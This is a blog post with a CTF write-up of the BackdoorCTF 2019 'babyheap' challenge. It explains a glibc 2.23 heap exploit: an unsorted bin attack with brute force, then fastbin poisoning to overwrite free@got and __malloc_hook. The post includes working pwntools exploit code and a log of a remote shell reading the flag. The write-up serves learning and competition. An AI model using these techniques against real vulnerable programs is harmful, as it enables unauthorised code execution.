---
layout: post
title:  "BackdoorCTF 2019: babyheap"
date:   2019-10-27 23:30:01 +0800
categories: pwn
tags: BackdoorCTF
---

I played this CTF with 0x1 and got 9th place.

This was a Glibc 2.23 challenge with `global_max_fast` set to 0x10, meaning we have no access to the fastbin.

TL;DR:

1. Free a chunk into the unsorted bin
2. One byte brute force to overwrite the `bk` pointer of the free unsorted bin chunk to `&global_max_fast - 0x10`
3. Launch an unsorted bin attack to overwrite `global_max_fast` with the unsorted bin's address, giving us access to the fastbin.
4. Fastbin dup to get a chunk above the global array of chunks.
5. Overwrite index 0 of the global array of chunks to point to `free@got`.
6. Overwrite `free@got` with `printf@plt`.
7. Edit the chunk above the global array of chunks and set index 0 to point to `puts@got`.
8. Call `free` on index 0 to get `puts` libc leak.
9. Fastbin dup attack to overwrite `__malloc_hook` to one gadget and get shell.

### Challenge

**Points**: 286

>Just another babyheap challenge.
>
>[http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap](http://backdoor.static.beast.sdslabs.co/static/babyheap/babyheap)
>
>[http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6](http://backdoor.static.beast.sdslabs.co/static/babyheap/libc.so.6)
>
>`nc 51.158.118.84 17001`
>
>Flag format: CTF{...}
>
>Created by: [Nipun Gupta](https://backdoor.sdslabs.co/users/fs0ciety)
>
>No. of Correct Submissions: 12

### Solution

This challenge was very interesting. I've read writeups of similar challenges before but never done a challenge of this type, so this was a good learning experience for me.

#### Reverse Engineering

Running the binary shows us this:
```
----------DATA BANK----------
1) Add data
2) Edit data
3) Remove data
4) Exit
>> 
```

It looks very similar to babytcache, but without the ability to view data. It is also GLIBC 2.23. It also does not have PIE or Full RELRO enabled:
```sh
vagrant@ubuntu1604:/ctf/practice/backdoorctf/babyheap$ checksec babyheap
[*] '/ctf/practice/backdoorctf/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Looking at the binary now, the main function right at the beginning does the following:
```c
mallopt(1, 0);
```

If you look at the manpage of `mallopt`, you will see that this means that the binary is disabling the fastbin by setting `global_max_fast` to a value of 0x10. Since chunks must have a minimum size of 0x20 (with the metadata), the fastbin is impossible to use like this.

As for vulnerabilities, it is the exact same as babytcache except some constraints, so I will skip showing my interpretation of the pseudocode for each function.

1. The add function lets you add up to 12 chunks max throughout the process's lifetime.
2. The free function has a UAF. It also has a free limit of 8 frees.

#### Steps to solve

First, we must overwrite `global_max_fast` with some value that is not 0x10, so we can use the fastbins again. Since there is no easy way to get a leak, it will be almost impossible to launch a small bin unsafe unlink attack to overwrite anything useful.

Since we don't have a leak, the overwriting of `global_max_fast` required bruteforcing a single byte. If you add two chunks of size 0x30 and free the first one, you can compare the address of `global_max_fast` vs the address of the unsorted bin and see the following:
```c
pwndbg> unsortedbin
unsortedbin
all: 0x1c25000 —▸ 0x7f2e38f3bb78 (main_arena+88) ◂— 0x1c25000
pwndbg> p &global_max_fast 
$1 = (size_t *) 0x7f2e38f3d7f8 <global_max_fast>
```

You will notice that the least significant byte of `global_max_fast` is always `0xf8`, and the second least significant byte will constantly change. Everything else will be the same.

We can brute force the second byte and have a 1/8 chance of getting the address of `global_max_fast`.

I decided to launch an unsorted bin attack to overwrite `global_max_fast` with the address of the unsorted bin. If you are unfamiliar with the unsorted bin attack, you may refer to [this](https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c).

Essentially, I chose a chunk of size 0x30 to perform the unsorted bin attack on. Since it will corrupt the unsorted bin, it will mean we can't malloc any chunks <= 0x30 in size anymore, which is fine for us.

Here is how the 1 byte bruteforce works:
```python
while True:
	p = start()
	add(0, 0x30, 'A'*0x30) # Used for unsorted bin attack
	add(1, 0x68, 'B'*0x68) # Used for fastbin dup

	free(0) # Send chunk A to the unsorted bin

	# Overwrite A's bk with bruteforced &global_max_fast - 0x10
	edit(0, '\x00'*8 + p16(0x27e8))

	try:
		# Launch the unsorted bin attack
		add(2, 0x30, 'C'*0x30)

		# If the unsorted bin attack successfully overwrote global_max_fast,
		# Then we can do a fastbin poisoning attack to get a chunk right above the
		# global data array
		#
		# If we successfully get the chunk there, overwrite idx 0 with free@got
		free(1)
		edit(1, p64(0x6020cd-0x10))
		add(3, 0x68, 'Z'*8)
		add(4, 0x68, 'Z'*0x53 + p64(free_got))
		if args.GDB:
			debug([])
		break
	except:
		# If it didn't work, close the process and try again
		p.close()
		continue
```

Initially we free the 0x30 chunk into the unsorted bin and overwrite the last byte with 0xe8, and the second last byte with one of the many valid bytes I found `&global_max_fast` had with gdb. Then, within a **try-except** block, we launch the unsorted bin attack and then immediately try to do the fastbin poisoning attack. If the unsorted bin attack succeeded, then the fastbin attack will work, otherwise it will go to the **except** block and restart.

Should the fastbin attack succeed, we pick this memory address because it looks like a valid chunk header for a 0x68 sized chunk:
```c
pwndbg> x/4gx 0x6020cd-0x10
0x6020bd:       0xfff7dd2540000000      0x000000000000007f
0x6020cd:       0x0000000000000000      0x0000000000000000
```

We then simply write enough bytes until we reach the global data array and overwrite index 0 to the address of `free@got`.

If all of this succeeds, we will be out of the while loop now. My plan was to overwrite `free` with `printf` and use that to leak a libc address. Before I do that though, I free another 0x68 sized chunk into the fastbin to prepare for the second fastbin poisoning attack. I then overwrite `free@got` with the address of `printf@plt`, and change index 0 to point to `puts@got` and attempt to free index 0. This will cause printf to be called with the address stored in index 0, which is actually `puts@got`, giving us a leak:
```python
free(3) # Prep for next fastbin poisoning attack
edit(0, p64(printf)) # Overwrite free with printf
edit(4, 'Z'*0x53 + p64(0x602020)) # Change idx 0 to puts@got
free(0) # printf(puts@got)

libc.address = u64(p.recv(6).ljust(8, '\x00')) - libc.sym['puts']
log.info('Libc base: ' + hex(libc.address))
```

Finally, we do the classic fastbin poisoning attack to get a chunk at `__malloc_hook-0x30+0xd` and overwrite `__malloc_hook` with a working one gadget and get a shell:
```python
edit(3, p64(libc.sym['__malloc_hook']-0x30+0xd))

add(5, 0x68, 'Z'*8)
add(6, 0x68, 'B'*0x13 + p64(libc.address+0xf1147))

p.sendlineafter('>> ', '1')
p.sendlineafter(':\n', '8')
p.sendlineafter(':\n', '104')

p.interactive()
```

It took quite a bit of time to work remotely due to the brute force, so I just cut out the brute force bit.
```sh
vagrant@ubuntu1604:/ctf/practice/backdoorctf/babyheap$ ./exploit.py REMOTE
[*] '/ctf/practice/backdoorctf/babyheap/babyheap'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/ctf/practice/backdoorctf/babyheap/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
REMOTE PROCESS
[+] Opening connection to 51.158.118.84 on port 17001: Done
[*] Libc base: 0x7f9e95bcc000
[*] Switching to interactive mode
$ ls
Dockerfile
babyheap
babyheap.c
beast.toml
flag.txt
post-build.sh
public
setup.sh
$ cat flag.txt
CTF{REDACTEDREDACTEDREDACTED}
$ 
```
